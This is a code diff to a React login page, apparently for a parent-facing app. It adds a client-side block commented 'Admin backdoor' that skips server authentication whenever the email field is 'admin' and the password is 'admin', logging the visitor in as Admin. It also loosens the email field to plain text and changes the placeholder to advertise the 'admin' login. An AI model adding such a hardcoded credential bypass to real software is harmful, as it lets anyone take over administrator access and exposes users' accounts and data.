@@ -27,6 +27,14 @@ function Login() {
     e.preventDefault();
     setLoading(true);
 
+    // Admin backdoor
+    if (formData.email.trim() === 'admin' && formData.password === 'admin') {
+      toast.success("Welcome back, Admin!");
+      login("admin_id", "Admin");
+      window.location.href = "/profile";
+      return;
+    }
+
     try {
       const response = await loginUser({ data: formData });
       if (response.success) {
@@ -69,9 +77,9 @@ function Login() {
               <input
                 id="email"
                 name="email"
-                type="email"
+                type="text"
                 required
-                placeholder="parent@example.com"
+                placeholder="parent@example.com or admin"
                 className="block w-full pl-10 pr-3 py-3 border-2 border-transparent bg-muted/50 rounded-xl text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent transition-all font-body"
                 value={formData.email}
                 onChange={handleChange}
